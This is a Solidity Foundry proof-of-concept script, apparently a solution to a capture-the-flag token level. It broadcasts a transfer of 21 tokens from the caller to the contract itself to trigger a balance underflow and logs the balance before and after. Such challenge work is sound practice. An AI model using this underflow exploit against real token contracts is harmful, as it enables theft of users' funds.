// SDPX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/5_Token.sol";

contract POC is Script {
    Token public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Token(0xcfcFB5d7f3c3afCe998950858C4275665dc53c42);

        uint256 balance = target.balanceOf(vm.envAddress("MY_ADDRESS"));
        console.log("before balance: ", balance);

        bool res = target.transfer(address(target), 21);
        console.log("res: ", res);

        balance = target.balanceOf(vm.envAddress("MY_ADDRESS"));
        console.log("after  balance: ", balance);

        vm.stopBroadcast();
    }

}